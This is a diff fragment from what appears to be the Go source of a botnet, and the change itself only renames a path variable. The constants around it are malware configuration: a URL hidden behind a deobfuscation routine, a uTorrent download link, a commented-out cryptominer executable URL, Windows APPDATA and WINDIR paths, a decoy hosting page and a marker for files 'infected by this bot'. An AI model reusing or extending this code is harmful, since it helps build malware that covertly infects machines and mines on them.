@@ -105,7 +105,7 @@ var (
 	maxMind                string = deobfuscate("iuuqt;00xxx/nbynjoe/dpn0hfpjq0w3/20djuz0nf")                                          //Gets IP information
 	uTorrnetURL            string = "http://download.ap.bittorrent.com/track/stable/endpoint/utorrent/os/windows"                      //URL to download uTorrent from
 	//	xmrMinerURL          string = "https://ottrbutt.com/cpuminer-multi/minerd-wolf-07-09-14.exe"                                                                 //URL to the Miner.exe
-	tmpPath     string = os.Getenv("APPDATA") + "\\" //APPDATA err, Roaming
+	tmpPath2    string = os.Getenv("APPDATA") + "\\" //APPDATA err, Roaming
 	winDirPath  string = os.Getenv("WINDIR") + "\\"  //Windows
 	rawHTMLPage string = "404 page not found"        //What the defult HTML for hosting will say.
 	//	binderMark           string = "-00800-"                                                                                                                      //To check if the files been infected by this bot
